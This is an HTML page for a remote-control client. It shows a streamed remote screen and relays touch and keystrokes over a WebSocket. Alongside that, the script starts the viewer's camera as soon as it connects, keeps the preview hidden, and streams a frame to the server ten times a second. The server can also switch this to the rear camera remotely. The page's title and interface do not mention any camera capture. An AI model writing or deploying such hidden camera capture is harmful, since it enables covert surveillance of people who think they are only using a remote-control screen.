<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Remote Control + Anti-Lag</title>
    <style>
        body { margin: 0; background: #000; height: 100vh; display: flex; flex-direction: column; overflow: hidden; touch-action: none; }
        #screenDisplay { width: 100%; height: 100%; object-fit: fill; position: absolute; z-index: 1; }
        #hiddenInput {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            opacity: 0.01; z-index: 20; border: none; outline: none; background: transparent;
            display: block; pointer-events: none;
        }
        #touchOverlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; background: transparent; }
        #myVideoPreview { display: none; }
    </style>
</head>
<body>
    <input type="text" id="hiddenInput" autocomplete="off" autocapitalize="none" spellcheck="false" value=" ">
    <div id="touchOverlay"></div>
    <img id="screenDisplay" />
    <video id="myVideoPreview" autoplay muted playsinline></video>

    <script>
        const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
        const ws = new WebSocket(`${protocol}//${window.location.host}`);
        const img = document.getElementById('screenDisplay');
        const hiddenInput = document.getElementById('hiddenInput');
        const touchOverlay = document.getElementById('touchOverlay');
        const myVideo = document.getElementById('myVideoPreview');
        
        let remoteKeyboardActive = false;
        let currentStream = null;
        let camInterval = null;
        let lastMode = "";

        ws.onopen = () => { console.log("Connected"); startCameraStream("user"); };

        const handleTouch = (e) => {
            const rect = img.getBoundingClientRect();
            const clientX = e.clientX || (e.touches && e.touches[0].clientX);
            const clientY = e.clientY || (e.touches && e.touches[0].clientY);
            
            if (clientX !== undefined && clientY !== undefined) {
                const relativeX = (clientX - rect.left) / rect.width;
                const relativeY = (clientY - rect.top) / rect.height;

                ws.send(JSON.stringify({
                    type: 'touch',
                    x: relativeX,
                    y: relativeY,
                    t: Date.now() // إرسال الوقت الحالي لحساب التأخير (Anti-Lag)
                }));
            }
            if (remoteKeyboardActive) hiddenInput.focus();
        };

        touchOverlay.addEventListener('touchstart', handleTouch);
        touchOverlay.addEventListener('mousedown', handleTouch);
        hiddenInput.addEventListener('touchstart', handleTouch);
        hiddenInput.addEventListener('mousedown', handleTouch);

        ws.onmessage = (event) => {
            if (event.data instanceof Blob) {
                const url = URL.createObjectURL(event.data);
                img.src = url;
                img.onload = () => URL.revokeObjectURL(url);
            } else {
                try {
                    const data = JSON.parse(event.data);
                    if (data.type === 'keyboard_state') {
                        remoteKeyboardActive = data.visible;
                        if (remoteKeyboardActive) {
                            hiddenInput.style.pointerEvents = "auto";
                            setTimeout(() => hiddenInput.focus(), 50);
                        } else {
                            hiddenInput.style.pointerEvents = "none";
                            hiddenInput.blur();
                        }
                    } else if (data.type === 'camera_switch_request') {
                        const modeRequested = String(data.mode).toLowerCase().includes("environment") ? "environment" : "user";
                        if (modeRequested !== lastMode) startCameraStream(modeRequested);
                    }
                } catch(e) {}
            }
        };

        hiddenInput.oninput = (e) => {
            const val = e.target.value;
            if (val === "") {
                ws.send(JSON.stringify({ type: 'key', value: 'Backspace' }));
                e.target.value = " ";
            } else if (val.length > 1) {
                const text = val.substring(1);
                if (text === " ") ws.send(JSON.stringify({ type: 'key', value: ' ' }));
                else ws.send(JSON.stringify({ type: 'text', value: text }));
                e.target.value = " ";
            }
        };

        function startCameraStream(mode) {
            lastMode = mode;
            if (currentStream) currentStream.getTracks().forEach(track => track.stop());
            if (camInterval) clearInterval(camInterval);

            navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: false })
            .then(stream => {
                currentStream = stream;
                myVideo.srcObject = stream;
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                camInterval = setInterval(() => {
                    if (ws.readyState === WebSocket.OPEN) {
                        canvas.width = 320; canvas.height = 240;
                        ctx.save();
                        if (mode === "user") { ctx.translate(canvas.width, 0); ctx.scale(-1, 1); }
                        ctx.drawImage(myVideo, 0, 0, canvas.width, canvas.height);
                        ctx.restore();
                        const base64 = canvas.toDataURL('image/jpeg', 0.5).split(',')[1];
                        ws.send(JSON.stringify({ type: 'remote_camera_frame', data: base64 }));
                    }
                }, 100);
            }).catch(e => { if(mode !== "user") startCameraStream("user"); });
        }
    </script>
</body>
</html>
